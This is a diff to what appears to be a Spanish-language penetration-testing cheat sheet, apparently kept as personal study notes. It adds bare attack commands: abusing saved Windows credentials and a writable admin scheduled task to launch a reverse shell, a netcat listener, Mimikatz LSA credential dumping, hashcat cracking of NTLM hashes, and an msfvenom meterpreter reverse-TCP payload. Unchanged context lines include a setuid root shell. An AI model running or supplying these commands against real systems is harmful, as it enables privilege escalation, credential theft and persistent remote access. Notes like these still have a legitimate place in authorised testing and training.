@@ -925,6 +925,24 @@ ________________________________________________________________________________
 	net start filepermsvc
 
 
+# SAVED CREDS # Credenciales guardadas, en caso de estar un usuario con mas privilegios o el admin, se aprovechará.
+	cmdkey /list
+# Pasar la reverse.exe al target y en Kali permanecer a la escucha
+	nc -lvnp 4444
+# Pasar la reverse shell al equipo y editar con el comando runas (nano en Windows)
+	runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+
+# SCHEDULED TASKS # Buscar tareas programadas con permiso de edicion que se ejecuten con admin
+	schtasks /query /fo LIST /v
+# Comprobar el programa
+	type C:\DevTools\ejemplo.ps1
+# Ver los permisos del programa
+	C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\ejemplo.ps1
+# Con la reverse ya pasada, se le añade otro programa para que lo ejecute tras el primero
+	echo C:\PrivEsc\reverse.exe >> C:\DevTools\ejemplo.ps1
+
+
 ACTIVE DIRECTORY
 _________________________________________________________________________________________
 
@@ -939,8 +957,26 @@ ________________________________________________________________________________
 	ldapsearch -LLL -x -H ldap://dominio.local -b "" -s base "(objectclass=*)"   ---   descubrir el DC por medio de ldap
 
 
-PERSISTENCE
+EXTRACT CREDENTIALS
 _________________________________________________________________________________________
+
+# MIMIKATZ # Descargar el programa y pasarlo al target
+#Abrir el rpograma
+	mimikatx.exe
+# Intentar o poner el programa el privilegiado
+	privilege::debug
+# Mostrar todas las credenciales
+	lsadump::lsa /patch
+# Coger la contraseña NTLM (codigo 1000 en hashcat) y pasar el hashcat
+	hashcat -m 1000 [HASH] rockyou.txt
+
+
+PERSISTENCE / BACKDOOR
+_________________________________________________________________________________________
+
+# METASPLOIT # Crear el payload con msfvenom
+	msfvenom -p windoes/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
+
 
 # CAPABILITIES # Metodo de persistencia, solo desde ROOT, escalamos privilegios colocando una capability 
 # Filtrar en https://gtfobins.github.io/ por capabilities y comprobar si estan instalados
@@ -956,25 +992,21 @@ ________________________________________________________________________________
 	python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 
 
-EXTRACT CREDENTIALS
-_________________________________________________________________________________________
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 PIVOTING
 _________________________________________________________________________________________
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 TRATAMIENTO DE IMAGENES
@@ -987,7 +1019,6 @@ strings imagen.png   ---   sacar los strings, texto, datos ocultos de una imagen
 BORRAR HUELLAS
 _________________________________________________________________________________________
 
-#
 
 
 ===========================
